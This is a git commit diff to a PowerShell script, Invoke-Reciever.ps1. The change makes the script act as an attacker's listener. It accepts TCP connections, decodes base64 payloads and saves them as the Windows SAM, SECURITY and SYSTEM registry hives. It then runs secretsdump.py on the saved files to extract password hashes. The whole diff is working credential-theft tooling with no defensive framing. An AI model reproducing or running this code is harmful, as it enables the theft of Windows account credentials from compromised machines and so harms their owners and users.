6c8c8bd8797f1e4f264d6871b26b2d9347b73353
mo-tec <moritzpfefferkorn@hotmail.com>
2020-10-13 01:24:17 +0200

    Update Invoke-Reciever.ps1

--- Invoke-Reciever.ps1
+++ Invoke-Reciever.ps1
@@ -8,13 +8,33 @@ function Invoke-Reciever {
     $endpoint = new-object System.Net.IPEndPoint ([system.net.ipaddress]::any, $port)
     $listener = new-object System.Net.Sockets.TcpListener $endpoint
     $listener.start()
+    Write-Host Waiting For Connection...
+    $client = $listener.AcceptTcpClient()
+    Write-Host Starting Data Processing...
+    $stream = $client.GetStream()
+    $byte1 = New-Object byte[] 1000000
+    $bytes1 = $stream.read($byte1, 0, $byte1.Length)
+    $msg1 += [text.encoding]::ASCII.GetString( (1..$bytes1 | ForEach-Object { $byte1[$_-1] } ) )
+    [IO.File]::WriteAllBytes('.\SAM', [Convert]::FromBase64String($msg1))
+    Write-Host Processed SAM
     $client = $listener.AcceptTcpClient()
     $stream = $client.GetStream()
-    $byte = New-Object byte[] 1024
-    $bytes = $stream.read($byte, 0, $byte.Length)
-    $msg += [text.encoding]::ASCII.GetString( (1..$bytes | ForEach-Object { $byte[$_-1] } ) )
+    $byte2 = New-Object byte[] 1000000
+    $bytes2 = $stream.read($byte2, 0, $byte2.Length)
+    $msg2 += [text.encoding]::ASCII.GetString( (1..$bytes2 | ForEach-Object { $byte2[$_-1] } ) )
+    [IO.File]::WriteAllBytes('.\SECURITY', [Convert]::FromBase64String($msg2))
+    Write-Host Processed SECURITY
+    $client = $listener.AcceptTcpClient()
+    $stream = $client.GetStream()
+    $byte3 = New-Object byte[] 50000000
+    $bytes3 = $stream.read($byte3, 0, $byte3.Length)
+    $msg3 += [text.encoding]::ASCII.GetString( (1..$bytes3 | ForEach-Object { $byte3[$_-1] } ) )
+    [IO.File]::WriteAllBytes('.\SYSTEM', [Convert]::FromBase64String($msg3))
+    Write-Host Processed SYSTEM
+    Write-Host Finished Processing
     $listener.Stop()
     $listener.Server.Dispose()
-    return $msg
+    Write-Host Dumping Hashes With secretsdump.py
+    .\secretsdump.py -system SYSTEM -security SECURITY -sam SAM LOCAL
 }
 Invoke-Reciever
